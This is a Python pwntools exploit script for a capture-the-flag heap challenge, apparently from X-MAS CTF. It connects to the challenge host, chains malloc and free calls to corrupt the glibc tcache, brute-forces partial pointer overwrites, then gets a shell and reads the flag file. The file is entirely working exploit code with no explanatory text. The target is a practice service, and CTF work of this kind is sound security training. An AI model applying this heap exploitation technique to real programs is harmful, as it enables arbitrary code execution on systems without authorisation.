from pwn import *
import random

def solve(seed1, seed2):
  p = remote("challs.xmas.htsp.ro", 12004)

  def alloc(idx, size, pay="AAAA"):
    p.sendline("1")
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", str(size))
    p.sendafter(":", pay)
    p.recvuntil("Created")

    p.recvuntil(">")

  def free(idx):
    p.sendline("2")
    p.sendlineafter(":", str(idx))
    p.recvuntil("Deleted")

    p.recvuntil(">")

  p.recvuntil(">")

  alloc(8, 0xa0)
  alloc(0, 0x90)
  alloc(1, 0xf0)

  for i in range(7):
    free(0)

  free(0)

  alloc(0, 0x90, p64(0) + "\x10")

  # Pad 0xf0 bin to prevent underflow
  for i in range(5):
    free(1)
  
  free(1)
  free(1)

  free(8)
  free(8)
  alloc(6, 0xa0, "\x60")
  alloc(8, 0xa0, p64(0))
  alloc(7, 0xa0)

  alloc(1, 0xf0, "\x08") 
  alloc(2, 0xf0, p64(0x1337))
  alloc(3, 0xf0, p64(0xb1) + p64(0) + "\x18")

  alloc(4, 0xa0)

  free(1)
  free(2)

  alloc(1, 0xf0, "\x18")
  alloc(2, 0xf0)
  alloc(5, 0xf0)
  # alloc(9, 0xf0, p64(0) * 2 + p64(0))

  overw = "\x8c" + seed1 + seed2
  print(":".join("{:02x}".format(ord(c)) for c in overw))
  alloc(9, 0xf0, p64(0) * 2 + overw)
  
  
  p.sendline("1337")
  p.sendlineafter(":", "3")
  p.sendlineafter(":", "0")
  p.sendline("3")
  p.sendline("cat flag.txt")

  data = p.recvall()
  
  if "X-MAS" in data:
    print(data)
    print("FOUND FLAG")
    p.interactive()
    return
  
  if len(data) == 1 or "Reallocated\nSpace -4/10" in data or "malloc(): memory corruption" in data or "atal error: glibc detected an invalid stdio handle" in data or "free(): invalid pointer" in data or "*** stack smashing detected ***" in data:
    p.close()
    raise EOFError

  print(data)

  p.interactive()

nibs = []
for i in range(16):
  nibs.append(i * 16 + 3)

nibs2 = []
for i in range(0x100):
  nibs2.append(i)

while True:
  try:
    nib = random.choice(nibs)
    nib2 = random.choice(nibs2)
    solve(chr(nib), chr(nib2))
    break
  except EOFError:
    print("EOFed")
